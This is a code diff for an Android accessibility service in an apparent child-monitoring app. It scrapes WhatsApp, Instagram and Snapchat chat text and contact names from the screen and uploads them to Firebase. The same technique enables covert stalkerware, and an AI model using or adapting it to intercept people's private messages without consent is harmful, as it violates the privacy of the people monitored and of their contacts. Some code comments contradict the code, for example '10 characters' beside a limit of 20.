@@ -3,20 +3,28 @@ package com.childmonitorai;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.graphics.Rect;
+import android.os.Build;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+
+import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.auth.FirebaseUser;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Date;
 import java.util.HashSet;
 import java.util.LinkedList;
 import java.util.List;
+import java.util.Locale;
 import java.util.Queue;
 import java.util.Set;
+
 
 public class SocialMediaMonitorService extends AccessibilityService {
     private static final String TAG = "SocialMediaMonitorService";
@@ -27,29 +35,8 @@ public class SocialMediaMonitorService extends AccessibilityService {
     private DatabaseReference mDatabase;
     private Set<String> processedMessages = new HashSet<>();
     private static final int MAX_PROCESSED_MESSAGES = 100;
+    private static final int MAX_MESSAGE_LENGTH = 20; // Limit for message length (10 characters)
 
-    public static class MessageData {
-        public String senderName;
-        public String receiverName;
-        public String message;
-        public String timestamp;
-        public String messageType;
-        public String appName;
-
-        public MessageData(String senderName, String receiverName, String message,
-                           String timestamp, String messageType, String appName) {
-            this.senderName = senderName;
-            this.receiverName = receiverName;
-            this.message = message;
-            this.timestamp = timestamp;
-            this.messageType = messageType;
-            this.appName = appName;
-        }
-
-        public MessageData() {
-            // Required empty constructor for Firebase
-        }
-    }
 
     private static class MessageInfo {
         String message;
@@ -81,7 +68,7 @@ public class SocialMediaMonitorService extends AccessibilityService {
                 AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
         info.notificationTimeout = 100;
 
-        String[] packageNames = {WHATSAPP_PACKAGE, INSTAGRAM_PACKAGE, SNAPCHAT_PACKAGE} ;
+        String[] packageNames = {WHATSAPP_PACKAGE, INSTAGRAM_PACKAGE, SNAPCHAT_PACKAGE};
         info.packageNames = packageNames;
 
         setServiceInfo(info);
@@ -122,9 +109,18 @@ public class SocialMediaMonitorService extends AccessibilityService {
             processedMessages.clear();
         }
     }
+    public String getUserId() {
+        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
+        return (user != null) ? user.getUid() : "No User Logged In"; // Returns user ID or a default message if no user is logged in
+    }
+
+    // Method to get the device model
+    public String getDeviceModel() {
+        return Build.MODEL; // Returns the device model (e.g., "Pixel 4")
+    }
+
 
     private void processWhatsappMessages(AccessibilityNodeInfo rootNode) {
-
         String contactName = extractContactName(rootNode);
         if (contactName.equals("Unknown Contact")) {
             Log.d(TAG, "Unable to determine WhatsApp contact name");
@@ -133,7 +129,15 @@ public class SocialMediaMonitorService extends AccessibilityService {
 
         List<MessageInfo> messages = extractWhatsappMessages(rootNode);
         for (MessageInfo messageInfo : messages) {
-            String messageKey = messageInfo.message + "|" + messageInfo.isOutgoing + "|" + contactName;
+            String sanitizedMessage = sanitizeData(messageInfo.message);
+            String sanitizedContactName = sanitizeData(contactName);
+
+            // Truncate the message to 10 characters
+            if (sanitizedMessage.length() > MAX_MESSAGE_LENGTH) {
+                sanitizedMessage = sanitizedMessage.substring(0, MAX_MESSAGE_LENGTH);
+            }
+
+            String messageKey = sanitizedMessage + "|" + messageInfo.isOutgoing + "|" + sanitizedContactName;
 
             if (processedMessages.add(messageKey)) {
                 Log.d(TAG, "New WhatsApp message: " + messageInfo.message +
@@ -149,7 +153,65 @@ public class SocialMediaMonitorService extends AccessibilityService {
                         "whatsapp"
                 );
 
-                //mDatabase.push().setValue(messageData);
+                // Call the helper method to upload message data
+                String userId = getUserId(); // Replace with actual user ID
+                String phoneModel = getDeviceModel(); // Replace with actual phone model
+                String uniqueMessageId = sanitizedContactName + "|" + messageInfo.isOutgoing + "|" + sanitizedMessage + "|" + System.currentTimeMillis();
+                String messageDate = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
+
+                DatabaseHelper databaseHelper = new DatabaseHelper();
+                //databaseHelper.uploadSocialMessageData(userId, phoneModel, messageData, uniqueMessageId, messageDate, "whatsapp");
+            }
+        }
+    }
+
+    // Helper method to sanitize messages and names to avoid Firebase path issues
+    private String sanitizeData(String input) {
+        if (input == null) {
+            return "";
+        }
+
+        // Remove characters that Firebase does not allow
+        return input.replaceAll("[.#$\\[\\]/]", "_");
+    }
+
+    private boolean isWhatsappOutgoingMessage(AccessibilityNodeInfo node) {
+        if (node == null) {
+            return false;
+        }
+
+        // Get the node's position on screen
+        Rect nodePosition = new Rect();
+        node.getBoundsInScreen(nodePosition);
+
+        // Get screen width
+        DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
+        int screenWidth = displayMetrics.widthPixels;
+
+        // Calculate center point of the message
+        int messageCenter = (nodePosition.left + nodePosition.right) / 2;
+
+        // If message center is in the right half of the screen, it's outgoing
+        return messageCenter > (screenWidth / 2);
+    }
+
+    // Helper method to log the view hierarchy for debugging
+    private void logViewHierarchy(AccessibilityNodeInfo node, int depth) {
+        if (node == null) return;
+
+        StringBuilder indent = new StringBuilder();
+        for (int i = 0; i < depth; i++) {
+            indent.append("  ");
+        }
+
+        String viewId = node.getViewIdResourceName();
+        Log.d("SocialMediaMonitorService", indent + "Node: " + viewId);
+
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                logViewHierarchy(child, depth + 1);
+                child.recycle();
             }
         }
     }
@@ -160,10 +222,21 @@ public class SocialMediaMonitorService extends AccessibilityService {
         List<MessageInfo> messages = extractInstagramMessages(rootNode);
         String contactName = extractInstagramContactName(rootNode);
 
+
         for (MessageInfo messageInfo : messages) {
             String messageKey = messageInfo.message + "|" + messageInfo.isOutgoing + "|" + contactName;
 
-            if (processedMessages.add(messageKey)) {
+            String sanitizedMessage = sanitizeData(messageInfo.message);
+            String sanitizedContactName = sanitizeData(contactName);
+
+            // Truncate the message to 10 characters
+            if (sanitizedMessage.length() > MAX_MESSAGE_LENGTH) {
+                sanitizedMessage = sanitizedMessage.substring(0, MAX_MESSAGE_LENGTH);
+            }
+
+            String messageKey1 = sanitizedMessage + "|" + messageInfo.isOutgoing + "|" + sanitizedContactName;
+
+            if (processedMessages.add(messageKey1)) {
                 Log.d(TAG, "New Instagram message: " + messageInfo.message +
                         " | Outgoing: " + messageInfo.isOutgoing +
                         " | Contact: " + contactName);
@@ -177,7 +250,14 @@ public class SocialMediaMonitorService extends AccessibilityService {
                         "instagram"
                 );
 
-                //mDatabase.push().setValue(messageData);
+                // Call the helper method to upload message data
+                String userId = getUserId(); // Replace with actual user ID
+                String phoneModel = getDeviceModel(); // Replace with actual phone model
+                String uniqueMessageId = sanitizedContactName + "|" + messageInfo.isOutgoing + "|" + sanitizedMessage + "|" + System.currentTimeMillis();
+                String messageDate = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
+
+                DatabaseHelper databaseHelper = new DatabaseHelper();
+                databaseHelper.uploadSocialMessageData(userId, phoneModel, messageData, uniqueMessageId, messageDate, "instagram");
             }
         }
     }
@@ -426,7 +506,7 @@ public class SocialMediaMonitorService extends AccessibilityService {
         for (AccessibilityNodeInfo container : messageContainers) {
             if (container != null && container.getText() != null) {
                 String messageText = container.getText().toString();
-                boolean isOutgoing = isOutgoingMessage(container);
+                boolean isOutgoing = isWhatsappOutgoingMessage(container);
                 messages.add(new MessageInfo(messageText, isOutgoing));
             }
         }
@@ -467,23 +547,7 @@ public class SocialMediaMonitorService extends AccessibilityService {
         return messages;
     }
 
-    private boolean isOutgoingMessage(AccessibilityNodeInfo node) {
-        AccessibilityNodeInfo parent = node;
-        int maxDepth = 10;
-        int currentDepth = 0;
 
-        while (parent != null && currentDepth < maxDepth) {
-            String viewId = parent.getViewIdResourceName();
-            if (viewId != null && viewId.contains("out_row")) {
-                return true;
-            }
-
-            parent = parent.getParent();
-            currentDepth++;
-        }
-
-        return false;
-    }
 
     private boolean isInstagramOutgoingMessage(AccessibilityNodeInfo node) {
         AccessibilityNodeInfo parent = node;
@@ -531,9 +595,18 @@ public class SocialMediaMonitorService extends AccessibilityService {
         List<MessageInfo> messages = extractSnapchatMessages(rootNode);
 
         for (MessageInfo messageInfo : messages) {
-            String messageKey = messageInfo.message + "|" + messageInfo.isOutgoing + "|" + contactName;
+            String sanitizedMessage = sanitizeData(messageInfo.message);
+            String sanitizedContactName = sanitizeData(contactName);
 
-            if (processedMessages.add(messageKey)) {
+            // Truncate the message to 10 characters
+            if (sanitizedMessage.length() > MAX_MESSAGE_LENGTH) {
+                sanitizedMessage = sanitizedMessage.substring(0, MAX_MESSAGE_LENGTH);
+            }
+
+            String messageKey2 = sanitizedMessage + "|" + messageInfo.isOutgoing + "|" + sanitizedContactName;
+
+
+            if (processedMessages.add(messageKey2)) {
                 Log.d(TAG, "New Snapchat message: " + messageInfo.message +
                         " | Outgoing: " + messageInfo.isOutgoing +
                         " | Contact: " + contactName);
@@ -547,7 +620,14 @@ public class SocialMediaMonitorService extends AccessibilityService {
                         "snapchat"
                 );
 
-                //mDatabase.push().setValue(messageData);
+                // Call the helper method to upload message data
+                String userId = getUserId(); // Replace with actual user ID
+                String phoneModel = getDeviceModel(); // Replace with actual phone model
+                String uniqueMessageId = sanitizedContactName + "|" + messageInfo.isOutgoing + "|" + sanitizedMessage + "|" + System.currentTimeMillis();
+                String messageDate = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
+
+                DatabaseHelper databaseHelper = new DatabaseHelper();
+                databaseHelper.uploadSocialMessageData(userId, phoneModel, messageData, uniqueMessageId, messageDate, "snapchat");
             }
         }
     }
